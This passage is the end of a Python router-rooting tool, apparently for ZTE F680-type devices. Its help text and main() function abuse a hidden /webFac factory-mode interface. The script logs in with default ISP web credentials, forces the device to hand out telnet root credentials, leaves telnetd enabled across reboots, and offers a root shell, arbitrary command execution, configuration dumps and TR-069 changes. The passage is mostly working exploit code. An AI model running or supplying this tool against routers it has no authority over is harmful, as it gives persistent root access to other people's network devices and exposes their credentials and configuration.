  -config [DIR]   download the event log and config
  -menu           interactive menu: TR-069, tuning, telnet

options:
  -ip <addr>      router address          default 192.168.1.1
  -port <n>       web port                default 80
  -u, -user <n>   web login               default mgts
  -p, -pass <pw>  web password            default mtsoao
  -host <addr>    this machine as the router sees it (for -config)
  -rand <0-59>    pin the key slot instead of picking one at random
  -retries <n>    handshake attempts      default 4
  -timeout <sec>  HTTP timeout            default 20
  -dry-run        with -menu: print commands instead of writing
  -quiet          print only the result
  -h, -help       this help

examples:
  f680-root.py -shell
  f680-root.py -status
  f680-root.py -exec "displayDB DevInfo"
  f680-root.py -ip 192.168.1.1 -u mgts -p mtsoao -creds

notes:
  one dash or two, same thing: -status == --status
  credentials rotate on every run; the previous password stops working
  telnetd survives reboots, so after a restart just re-run
  telnet allows two sessions; a closed one holds its slot for 300 seconds
"""


def main(argv: list[str] | None = None) -> int:
    argv = list(sys.argv[1:] if argv is None else argv)
    if any(a in ("-h", "-help", "--help") for a in argv):
        print(HELP_BODY, end="")
        return 0

    ap = argparse.ArgumentParser(
        prog="f680-root.py",
        add_help=False,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        usage="f680-root.py [mode] [options]",
        description=None,
        epilog=HELP_BODY,
    )
    ap.add_argument("-shell", "--shell", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("-status", "--status", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("-exec", "--exec", dest="command", metavar="CMD", help=argparse.SUPPRESS)
    ap.add_argument("-creds", "--creds", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("-check", "--check", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("-config", "--config", nargs="?", const="f680-dump", metavar="DIR",
                    help=argparse.SUPPRESS)
    ap.add_argument("-menu", "--menu", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("-dry-run", "--dry-run", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("-ip", "--ip", default="192.168.1.1", help=argparse.SUPPRESS)
    ap.add_argument("-port", "--port", type=int, default=80, help=argparse.SUPPRESS)
    ap.add_argument("-u", "-user", "--user", default="mgts", help=argparse.SUPPRESS)
    ap.add_argument("-p", "-pass", "--pass", dest="password", default="mtsoao",
                    help=argparse.SUPPRESS)
    ap.add_argument("-host", "--host", metavar="IP", help=argparse.SUPPRESS)
    ap.add_argument("-quiet", "--quiet", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("-rand", "--rand", type=int, default=None, help=argparse.SUPPRESS)
    ap.add_argument("-retries", "--retries", type=int, default=4, help=argparse.SUPPRESS)
    ap.add_argument("-timeout", "--timeout", type=float, default=20.0, help=argparse.SUPPRESS)
    args = ap.parse_args(argv)
    modes = (args.shell, args.status, args.command, args.config, args.menu,
             args.creds, args.check)
    if not any(modes):
        print(HELP_BODY, end="")
        return 0

    dev = Device(args.ip, args.port, args.timeout, verbose=not args.quiet)
    rng = random.Random()
    attempts = [args.rand] if args.rand is not None else [rng.randrange(60) for _ in range(args.retries)]

    if not probe_telnet(args.ip, args.port, timeout=args.timeout):
        print(f"[!] nothing answering on {args.ip}:{args.port}", file=sys.stderr)
        return 2

    if args.check:
        status, body = dev.post("webFac", b"SendSq.gch")
        alive = status == 400 and b"bad syntax" in body.lower()
        print(f"[{'ok' if alive else '--'}] /webFac factory surface "
              f"{'present' if alive else 'not detected'} (HTTP {status})")
        return 0 if alive else 3

    reply = None
    for attempt, rand in enumerate(attempts, 1):
        dev.say(f"\n--- handshake attempt {attempt}/{len(attempts)}")
        try:
            dev.reset()
            dev.request_factory_mode()
            if not dev.handshake(rand):
                continue
        except (ConnectionResetError, TimeoutError, OSError) as exc:
            dev.say(f"    transport error: {type(exc).__name__}: {exc}")
            time.sleep(1.5)
            continue

        if dev.check_login(args.user, args.password) is None:
            dev.say("    login rejected by the device")
            continue
        reply = dev.enter_mode2()
        if reply and parse_telnet_auth(reply):
            break
        dev.say(f"    mode=2 did not yield credentials: {str(reply)[:120]!r}")
        reply = None
        time.sleep(1.5)

    if not reply:
        print("[!] factory mode did not hand out credentials.", file=sys.stderr)
        print("    Check the web password, or the firmware may not expose /webFac.", file=sys.stderr)
        return 1

    auth = parse_telnet_auth(reply)
    if not auth:
        print(f"[!] unexpected reply: {reply[:200]!r}", file=sys.stderr)
        return 1
    user, password = auth

    time.sleep(1.0)
    print()
    print(f"host: {args.ip}")
    print(f"user: {user}")
    print(f"pass: {password}")
    print(f"telnet {args.ip}")
    print("Credentials rotate on each run. Telnetd stays enabled across reboots.")

    if args.creds:
        return 0

    if args.shell:
        print()
        return shell(args.ip, user, password)

    if args.status or args.command or args.config or args.menu:
        print()
        try:
            with TelnetSession(args.ip, user, password, timeout=args.timeout) as sess:
                if args.command:
                    print(sess.run(args.command))
                if args.status:
                    print(render_status(collect_status(sess)))
                if args.config:
                    for name in dump_config(sess, args.config, args.host):
                        print(f"saved {name}")
                    print(f"into {os.path.abspath(args.config)}")
                if args.menu:
                    return menu(sess, args)
        except RuntimeError as exc:
            print(f"[!] {exc}", file=sys.stderr)
            return 1
        except OSError as exc:
            print(f"[!] telnet: {exc}", file=sys.stderr)
            return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
